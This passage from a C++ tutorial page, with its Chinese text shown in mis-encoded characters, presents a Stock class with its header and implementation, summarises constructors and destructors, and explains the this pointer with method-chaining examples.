class="meta">#<span class="meta-keyword">ifndef</span> STOCK_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STOCK_H_</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Stock</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> company;</span><br><span class="line">    <span class="keyword">long</span> shares;</span><br><span class="line">    <span class="keyword">double</span> share_val;</span><br><span class="line">    <span class="keyword">double</span> total_val;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">set_tot</span><span class="params">()</span> </span>&#123; total_val = shares * share_val; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// æ„é€ å‡½æ•°</span></span><br><span class="line">    Stock(); <span class="comment">// é»˜è®¤æ„é€ å‡½æ•°</span></span><br><span class="line">    Stock(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp;co, <span class="keyword">long</span> n = <span class="number">0</span>, <span class="keyword">double</span> pr = <span class="number">0.0</span>);</span><br><span class="line">    <span class="comment">// ææ„å‡½æ•°</span></span><br><span class="line">    ~Stock();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å…¶ä»–æˆå‘˜å‡½æ•°</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">buy</span><span class="params">(<span class="keyword">long</span> num, <span class="keyword">double</span> price)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">sell</span><span class="params">(<span class="keyword">long</span> num, <span class="keyword">double</span> price)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">update</span><span class="params">(<span class="keyword">double</span> price)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// STOCK_H_</span></span></span><br></pre></td></tr></table></figure><p><strong>stock.cpp (æœ€ç»ˆç‰ˆæœ¬)</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// filepath: d:\ProgramData\files_Cpp\250424\stock.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stock.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// æ„é€ å‡½æ•°å®šä¹‰</span></span><br><span class="line">Stock::Stock() &#123;</span><br><span class="line">    company = <span class="string">&quot;no name&quot;</span>;</span><br><span class="line">    shares = <span class="number">0</span>;</span><br><span class="line">    share_val = <span class="number">0.0</span>;</span><br><span class="line">    total_val = <span class="number">0.0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Stock::Stock(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp;co, <span class="keyword">long</span> n, <span class="keyword">double</span> pr) &#123;</span><br><span class="line">    company = co;</span><br><span class="line">    <span class="keyword">if</span> (n &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Error: Number of shares can&#x27;t be negative. &quot;</span></span><br><span class="line">                  &lt;&lt; company &lt;&lt; <span class="string">&quot; shares set to 0.\n&quot;</span>; <span class="comment">// ä½¿ç”¨ cerr è¾“å‡ºé”™è¯¯</span></span><br><span class="line">        shares = <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        shares = n;</span><br><span class="line">    &#125;</span><br><span class="line">    share_val = pr;</span><br><span class="line">    set_tot();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ææ„å‡½æ•°å®šä¹‰</span></span><br><span class="line">Stock::~Stock() &#123;</span><br><span class="line">    <span class="comment">// åœ¨è¿™ä¸ªç®€å•ç±»ä¸­ï¼Œææ„å‡½æ•°ä½“å¯ä»¥ä¸ºç©º</span></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; &quot;Destructor called for &quot; &lt;&lt; company &lt;&lt; &quot;\n&quot;; // å¯ä»¥å–æ¶ˆæ³¨é‡Šæ¥è§‚å¯Ÿ</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å…¶ä»–æˆå‘˜å‡½æ•°å®šä¹‰</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Stock::buy</span><span class="params">(<span class="keyword">long</span> num, <span class="keyword">double</span> price)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (num &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Error: Number of shares purchased can&#x27;t be negative. &quot;</span></span><br><span class="line">                  &lt;&lt; <span class="string">&quot;Transaction aborted.\n&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        shares += num;</span><br><span class="line">        share_val = price;</span><br><span class="line">        set_tot();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Stock::sell</span><span class="params">(<span class="keyword">long</span> num, <span class="keyword">double</span> price)</span> </span>&#123;</span><br><span class="line">     <span class="keyword">if</span> (num &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Error: Number of shares sold can&#x27;t be negative. &quot;</span></span><br><span class="line">                  &lt;&lt; <span class="string">&quot;Transaction aborted.\n&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (num &gt; shares) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Error: You can&#x27;t sell more than you have! &quot;</span></span><br><span class="line">                  &lt;&lt; <span class="string">&quot;Transaction aborted.\n&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        shares -= num;</span><br><span class="line">        share_val = price;</span><br><span class="line">        set_tot();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Stock::update</span><span class="params">(<span class="keyword">double</span> price)</span> </span>&#123;</span><br><span class="line">    share_val = price;</span><br><span class="line">    set_tot();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Stock::show</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="comment">// ä½¿ç”¨ iomanip æ¥è®¾ç½®æ ¼å¼å¯èƒ½æ›´æ¸…æ™°</span></span><br><span class="line">    <span class="built_in">std</span>::ios_base::fmtflags orig =</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span>.setf(<span class="built_in">std</span>::ios_base::fixed, <span class="built_in">std</span>::ios_base::floatfield);</span><br><span class="line">    <span class="built_in">std</span>::streamsize prec = <span class="built_in">std</span>::<span class="built_in">cout</span>.precision(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Company: &quot;</span> &lt;&lt; company</span><br><span class="line">              &lt;&lt; <span class="string">&quot;  Shares: &quot;</span> &lt;&lt; shares &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;  Share Price: $&quot;</span> &lt;&lt; share_val;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span>.precision(<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;  Total Worth: $&quot;</span> &lt;&lt; total_val &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span>.setf(orig, <span class="built_in">std</span>::ios_base::floatfield);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span>.precision(prec);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="10-3-6-æ„é€ å‡½æ•°å’Œææ„å‡½æ•°å°ç»“"><a href="#10-3-6-æ„é€ å‡½æ•°å’Œææ„å‡½æ•°å°ç»“" class="headerlink" title="10.3.6 æ„é€ å‡½æ•°å’Œææ„å‡½æ•°å°ç»“"></a>10.3.6 æ„é€ å‡½æ•°å’Œææ„å‡½æ•°å°ç»“</h3><ul><li><strong>æ„é€ å‡½æ•°:</strong><ul><li>  ä¸ç±»åŒåï¼Œæ— è¿”å›ç±»å‹ã€‚</li><li>  åœ¨åˆ›å»ºå¯¹è±¡æ—¶è‡ªåŠ¨è°ƒç”¨ï¼Œç”¨äºåˆå§‹åŒ–å¯¹è±¡ã€‚</li><li>  å¯ä»¥é‡è½½ï¼ˆæä¾›ä¸åŒçš„å‚æ•°åˆ—è¡¨ï¼‰ã€‚</li><li>  å¦‚æœæ²¡æœ‰å®šä¹‰ä»»ä½•æ„é€ å‡½æ•°ï¼Œç¼–è¯‘å™¨ä¼šç”Ÿæˆä¸€ä¸ªé»˜è®¤æ„é€ å‡½æ•°ï¼ˆæ— å‚æ•°ï¼Œä»€ä¹ˆä¹Ÿä¸åšï¼‰ã€‚</li><li>  å¦‚æœå®šä¹‰äº†ä»»ä½•æ„é€ å‡½æ•°ï¼Œç¼–è¯‘å™¨ä¸å†ç”Ÿæˆé»˜è®¤æ„é€ å‡½æ•°ï¼›å¦‚æœéœ€è¦æ— å‚æ•°æ„é€ ï¼Œå¿…é¡»è‡ªå·±å®šä¹‰ã€‚</li></ul></li><li><strong>ææ„å‡½æ•°:</strong><ul><li>  ç±»åå‰åŠ  <code>~</code>ï¼Œæ— è¿”å›ç±»å‹ï¼Œæ— å‚æ•°ã€‚</li><li>  åœ¨å¯¹è±¡é”€æ¯æ—¶è‡ªåŠ¨è°ƒç”¨ï¼Œç”¨äºæ¸…ç†èµ„æºã€‚</li><li>  ä¸èƒ½é‡è½½ï¼Œä¸€ä¸ªç±»åªæœ‰ä¸€ä¸ªææ„å‡½æ•°ã€‚</li><li>  å¦‚æœç±»ä¸­ä½¿ç”¨äº† <code>new</code> åˆ†é…èµ„æºï¼Œé€šå¸¸éœ€è¦åœ¨ææ„å‡½æ•°ä¸­ä½¿ç”¨ <code>delete</code> æ¥é‡Šæ”¾ã€‚</li></ul></li></ul><p>æ„é€ å‡½æ•°å’Œææ„å‡½æ•°æ˜¯ C++ ç±»æœºåˆ¶çš„é‡è¦ç»„æˆéƒ¨åˆ†ï¼Œå®ƒä»¬ç¡®ä¿äº†å¯¹è±¡çš„æ­£ç¡®åˆå§‹åŒ–å’Œèµ„æºçš„å®‰å…¨é‡Šæ”¾ï¼Œæ˜¯å®ç°<strong>èµ„æºè·å–å³åˆå§‹åŒ– (RAII - Resource Acquisition Is Initialization)</strong> è¿™ä¸€é‡è¦ C++ ç¼–ç¨‹èŒƒå¼çš„åŸºçŸ³ã€‚</p><h2 id="10-4-this-æŒ‡é’ˆ"><a href="#10-4-this-æŒ‡é’ˆ" class="headerlink" title="10.4 this æŒ‡é’ˆ"></a>10.4 this æŒ‡é’ˆ</h2><p>åœ¨ C++ ç±»çš„æˆå‘˜å‡½æ•°å†…éƒ¨ï¼Œä½ æœ‰æ—¶å¯èƒ½éœ€è¦å¼•ç”¨<strong>è°ƒç”¨è¯¥å‡½æ•°çš„å¯¹è±¡æœ¬èº«</strong>ã€‚ä¾‹å¦‚ï¼Œå½“ä½ åœ¨ <code>stock1.show()</code> çš„å®ç°ä»£ç ä¸­ï¼Œå¦‚ä½•æ˜ç¡®åœ°æŒ‡ä»£ <code>stock1</code> è¿™ä¸ªå¯¹è±¡ï¼ŸC++ ä¸ºæ­¤æä¾›äº†ä¸€ä¸ªç‰¹æ®Šçš„æŒ‡é’ˆï¼Œç§°ä¸º <code>this</code> æŒ‡é’ˆã€‚</p><h3 id="this-æŒ‡é’ˆæ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#this-æŒ‡é’ˆæ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="this æŒ‡é’ˆæ˜¯ä»€ä¹ˆï¼Ÿ"></a><code>this</code> æŒ‡é’ˆæ˜¯ä»€ä¹ˆï¼Ÿ</h3><p><code>this</code> æ˜¯ä¸€ä¸ªéšå«çš„æŒ‡é’ˆï¼Œå®ƒå­˜åœ¨äºæ¯ä¸ª<strong>éé™æ€æˆå‘˜å‡½æ•°</strong>ï¼ˆnon-static member functionï¼‰å†…éƒ¨ã€‚å®ƒæŒ‡å‘<strong>è°ƒç”¨è¯¥æˆå‘˜å‡½æ•°çš„é‚£ä¸ªå¯¹è±¡</strong>ã€‚</p><ul><li>  å½“ä½ è°ƒç”¨ <code>stock1.show()</code> æ—¶ï¼Œåœ¨ <code>show()</code> å‡½æ•°çš„å†…éƒ¨ï¼Œ<code>this</code> æŒ‡é’ˆå°±æŒ‡å‘ <code>stock1</code> å¯¹è±¡ã€‚</li><li>  å½“ä½ è°ƒç”¨ <code>stock2.buy(..)</code> æ—¶ï¼Œåœ¨ <code>buy()</code> å‡½æ•°çš„å†…éƒ¨ï¼Œ<code>this</code> æŒ‡é’ˆå°±æŒ‡å‘ <code>stock2</code> å¯¹è±¡ã€‚</li></ul><p>ç¼–è¯‘å™¨åœ¨è°ƒç”¨æˆå‘˜å‡½æ•°æ—¶ï¼Œä¼šéšå¼åœ°å°†å¯¹è±¡çš„åœ°å€ä¼ é€’ç»™è¯¥å‡½æ•°ï¼Œè¿™ä¸ªåœ°å€å°±è¢« <code>this</code> æŒ‡é’ˆæ‰€æŒæœ‰ã€‚</p><p><strong>å…³é”®ç‚¹ï¼š</strong></p><ol><li> <strong>éšå«å‚æ•°:</strong> <code>this</code> æŒ‡é’ˆæ˜¯ä½œä¸ºéšå«å‚æ•°ä¼ é€’ç»™éé™æ€æˆå‘˜å‡½æ•°çš„ã€‚ä½ ä¸éœ€è¦åœ¨å‡½æ•°å‚æ•°åˆ—è¡¨ä¸­æ˜¾å¼å£°æ˜å®ƒã€‚</li><li> <strong>æŒ‡å‘è°ƒç”¨å¯¹è±¡:</strong> å®ƒæ€»æ˜¯æŒ‡å‘å½“å‰æ­£åœ¨æ‰§è¡Œå…¶æˆå‘˜å‡½æ•°çš„é‚£ä¸ªå¯¹è±¡ã€‚</li><li> <strong>ç±»å‹:</strong> <code>this</code> æŒ‡é’ˆçš„ç±»å‹æ˜¯ <code>ClassName * const</code>ï¼ˆå¯¹äºé <code>const</code> æˆå‘˜å‡½æ•°ï¼‰æˆ– <code>const ClassName * const</code>ï¼ˆå¯¹äº <code>const</code> æˆå‘˜å‡½æ•°ï¼‰ã€‚è¿™æ„å‘³ç€ <code>this</code> æŒ‡é’ˆæœ¬èº«æ˜¯ä¸€ä¸ªå¸¸é‡æŒ‡é’ˆï¼ˆä¸èƒ½è®©å®ƒæŒ‡å‘å…¶ä»–å¯¹è±¡ï¼‰ï¼Œå¹¶ä¸”å¯¹äº <code>const</code> æˆå‘˜å‡½æ•°ï¼Œå®ƒæŒ‡å‘ä¸€ä¸ª <code>const</code> å¯¹è±¡ï¼ˆä¸èƒ½é€šè¿‡ <code>this</code> ä¿®æ”¹å¯¹è±¡çš„æ•°æ®æˆå‘˜ï¼‰ã€‚</li><li> <strong>è®¿é—®æˆå‘˜:</strong> åœ¨æˆå‘˜å‡½æ•°å†…éƒ¨ï¼Œå½“ä½ ç›´æ¥è®¿é—®æ•°æ®æˆå‘˜ï¼ˆå¦‚ <code>shares</code>ï¼‰æˆ–è°ƒç”¨å…¶ä»–æˆå‘˜å‡½æ•°ï¼ˆå¦‚ <code>set_tot()</code>ï¼‰æ—¶ï¼Œå®é™…ä¸Šæ˜¯ç¼–è¯‘å™¨éšå¼åœ°ä½¿ç”¨äº† <code>this</code> æŒ‡é’ˆï¼Œç­‰åŒäº <code>this-&gt;shares</code> æˆ– <code>this-&gt;set_tot()</code>ã€‚</li></ol><h3 id="ä½¿ç”¨-this-æŒ‡é’ˆ"><a href="#ä½¿ç”¨-this-æŒ‡é’ˆ" class="headerlink" title="ä½¿ç”¨ this æŒ‡é’ˆ"></a>ä½¿ç”¨ <code>this</code> æŒ‡é’ˆ</h3><p>å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œä½ ä¸éœ€è¦æ˜¾å¼åœ°ä½¿ç”¨ <code>this</code> æŒ‡é’ˆï¼Œå› ä¸ºç¼–è¯‘å™¨ä¼šè‡ªåŠ¨å¤„ç†ã€‚ä¾‹å¦‚ï¼Œåœ¨ <code>Stock::buy</code> å‡½æ•°ä¸­ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Stock::buy</span><span class="params">(<span class="keyword">long</span> num, <span class="keyword">double</span> price)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (num &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// shares += num;       // éšå¼ä½¿ç”¨ this-&gt;shares</span></span><br><span class="line">        <span class="comment">// share_val = price; // éšå¼ä½¿ç”¨ this-&gt;share_val</span></span><br><span class="line">        <span class="comment">// set_tot();         // éšå¼è°ƒç”¨ this-&gt;set_tot()</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// ä¸‹é¢æ˜¯æ˜¾å¼ä½¿ç”¨ this çš„ç­‰æ•ˆå†™æ³•ï¼š</span></span><br><span class="line">        <span class="keyword">this</span>-&gt;shares += num;</span><br><span class="line">        <span class="keyword">this</span>-&gt;share_val = price;</span><br><span class="line">        <span class="keyword">this</span>-&gt;set_tot();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶è€Œï¼Œåœ¨æŸäº›ç‰¹å®šåœºæ™¯ä¸‹ï¼Œæ˜¾å¼ä½¿ç”¨ <code>this</code> æŒ‡é’ˆæ˜¯å¿…è¦çš„æˆ–æœ‰ç”¨çš„ï¼š</p><ol><li><p><strong>åŒºåˆ†åŒåå‚æ•°å’Œæˆå‘˜:</strong> å½“æˆå‘˜å‡½æ•°çš„å‚æ•°åä¸æ•°æ®æˆå‘˜åç›¸åŒæ—¶ï¼Œéœ€è¦ä½¿ç”¨ <code>this-&gt;</code> æ¥æ˜ç¡®æŒ‡å®šè®¿é—®çš„æ˜¯æ•°æ®æˆå‘˜ã€‚</p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Example</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> value;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// å‚æ•°å value ä¸æ•°æ®æˆå‘˜ value ç›¸åŒ</span></span><br><span class="line">    Example(<span class="keyword">int</span> value) &#123;</span><br><span class="line">        <span class="comment">// å¿…é¡»ä½¿ç”¨ this-&gt;value æ¥å¼•ç”¨æ•°æ®æˆå‘˜</span></span><br><span class="line">        <span class="keyword">this</span>-&gt;value = value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; &#125; <span class="comment">// è¿™é‡Œè®¿é—®çš„æ˜¯æˆå‘˜ value</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="function">Example <span class="title">ex</span><span class="params">(<span class="number">10</span>)</span></span>; <span class="comment">// è°ƒç”¨æ„é€ å‡½æ•°</span></span><br><span class="line">    ex.print();     <span class="comment">// è¾“å‡º 10</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> <em>(è™½ç„¶è¿™ç§å‘½åæ–¹å¼æœ‰æ—¶ä¼šç”¨åˆ°ï¼Œä½†ä¸€äº›ç¼–ç è§„èŒƒå»ºè®®é¿å…å‚æ•°åå’Œæˆå‘˜åå®Œå…¨ç›¸åŒï¼Œä¾‹å¦‚ä½¿ç”¨ <code>m_value</code> æˆ– <code>value_</code> ä½œä¸ºæˆå‘˜å)</em></p></li><li><p><strong>è¿”å›å¯¹è±¡è‡ªèº«çš„å¼•ç”¨æˆ–æŒ‡é’ˆ:</strong> å½“æˆå‘˜å‡½æ•°éœ€è¦è¿”å›è°ƒç”¨è¯¥å‡½æ•°çš„å¯¹è±¡æœ¬èº«æ—¶ï¼ˆé€šå¸¸æ˜¯ä¸ºäº†æ”¯æŒ**æ–¹æ³•é“¾å¼è°ƒç”¨ (Method Chaining)**ï¼‰ã€‚</p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Counter</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">Counter&amp; <span class="title">increment</span><span class="params">()</span> </span>&#123; <span class="comment">// è¿”å›ç±»å‹æ˜¯ Counter&amp;</span></span><br><span class="line">        count++;</span><br><span class="line">        <span class="keyword">return</span> *<span class="keyword">this</span>; <span class="comment">// è¿”å›è°ƒç”¨å¯¹è±¡è‡ªèº«çš„å¼•ç”¨</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">Counter&amp; <span class="title">add</span><span class="params">(<span class="keyword">int</span> val)</span> </span>&#123; <span class="comment">// è¿”å›ç±»å‹æ˜¯ Counter&amp;</span></span><br><span class="line">        count += val;</span><br><span class="line">        <span class="keyword">return</span> *<span class="keyword">this</span>; <span class="comment">// è¿”å›è°ƒç”¨å¯¹è±¡è‡ªèº«çš„å¼•ç”¨</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">display</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Count: &quot;</span> &lt;&lt; count &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Counter c;</span><br><span class="line">    c.display(); <span class="comment">// Output: Count: 0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ–¹æ³•é“¾å¼è°ƒç”¨</span></span><br><span class="line">    c.increment().add(<span class="number">5</span>).increment(); <span class="comment">// å…ˆè°ƒç”¨ increment(), è¿”å› c çš„å¼•ç”¨ï¼›</span></span><br><span class="line">                                      <span class="comment">// å†å¯¹ c è°ƒç”¨ add(5), è¿”å› c çš„å¼•ç”¨ï¼›</span></span><br><span class="line">                                      <span class="comment">// æœ€åå¯¹ c è°ƒç”¨ increment()</span></span><br><span class="line"></span><br><span class="line">    c.display(); <span class="comment">// Output: Count: 7</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> åœ¨ <code>increment()</code> å’Œ <code>add()</code> ä¸­ï¼Œ<code>return *this;</code> è¿”å›çš„æ˜¯è°ƒç”¨å¯¹è±¡ï¼ˆ<code>c</code>ï¼‰çš„å¼•ç”¨ï¼Œä½¿å¾—å¯ä»¥åœ¨å…¶åç»§ç»­è°ƒç”¨è¯¥å¯¹è±¡çš„å…¶ä»–æˆå‘˜å‡½æ•°ã€‚</p></li><li><p> <strong>åœ¨å‹å…ƒå‡½æ•°æˆ–ç‹¬ç«‹å‡½æ•°ä¸­ä¼ é€’å¯¹è±¡:</strong> è™½ç„¶ <code>this</code> æœ¬èº«åªåœ¨æˆå‘˜å‡½æ•°å†…å¯ç”¨ï¼Œä½†ä½ å¯ä»¥å°† <code>*this</code>ï¼ˆå¯¹è±¡æœ¬èº«ï¼‰æˆ– <code>this</code>ï¼ˆå¯¹è±¡åœ°å€ï¼‰ä¼ é€’ç»™éœ€è¦æ“ä½œè¯¥å¯¹è±¡çš„å…¶ä»–å‡½æ•°ã€‚</p></li></ol><h3 id="this-ä¸-Stock-ç±»"><a href="#this-ä¸-Stock-ç±»" class="headerlink" title="this ä¸ Stock ç±»"></a><code>this</code> ä¸ <code>Stock</code> ç±»</h3><p>è®©æˆ‘ä»¬çœ‹çœ‹ <code>this</code> å¦‚ä½•åº”ç”¨äºä¹‹å‰çš„ <code>Stock</code> ç±»ã€‚å‡è®¾æˆ‘ä»¬æƒ³æ·»åŠ ä¸€ä¸ªæ–¹æ³•ï¼Œç”¨äºæ¯”è¾ƒä¸¤ä¸ª <code>Stock</code> å¯¹è±¡çš„æ€»ä»·å€¼ï¼Œå¹¶è¿”å›æ€»ä»·å€¼è¾ƒé«˜çš„é‚£ä¸ªå¯¹è±¡çš„å¼•ç”¨ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span 